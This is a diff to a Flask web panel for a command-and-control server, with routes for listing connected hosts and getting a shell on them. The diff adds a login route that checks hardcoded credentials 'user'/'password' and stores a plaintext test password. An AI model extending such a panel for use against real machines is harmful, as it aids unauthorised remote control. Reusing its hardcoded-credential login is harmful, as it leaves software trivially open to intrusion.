@@ -1,5 +1,5 @@
 from flask import *
-import os
+import os, time
 from Socket.Server import Server
 
 
@@ -13,7 +13,24 @@ class FlskSevrev(object):
         self.c2Server = Server(port=C2Port,PrivateKey=C2Private)
         self.c2Server.start()
         self._ruleResetor()
+        self.test = {'Aharon': 'Qwerty123'}
+        self.numberOftry = {}
         
+
+    def loginPage(self):
+        return render_template("Login.html")
+
+    def login(self):
+        if request.method == 'POST':
+            data = request.get_json()
+            username = data['username']
+            password = data['password']
+            if username == 'user' and password == 'password':
+                return jsonify({"message": "Login successful"})
+            else:
+                return jsonify({"message": "Invalid username or password"}), 401
+        return self.loginPage()
+
 
     def getshell(self,hostname):
         if self.c2Server.connections.isconnected(hostname):
@@ -50,7 +67,9 @@ class FlskSevrev(object):
 
     
     def _ruleResetor(self):
-        self.app.add_url_rule('/', 'homePage', self.homePage)
+        self.app.add_url_rule('/','loginPage',self.loginPage)
+        self.app.add_url_rule('/login','login', self.login ,methods=['GET', 'POST'])
+        self.app.add_url_rule('/home', 'homePage', self.homePage)
         self.app.add_url_rule('/listConnections', 'listConnections', self.listConnections)
         self.app.add_url_rule('/getshell/<hostname>', 'getshell', self.getshell)
         self.app.add_url_rule('/send_message', 'send_message', self.send_message, methods=['POST'])
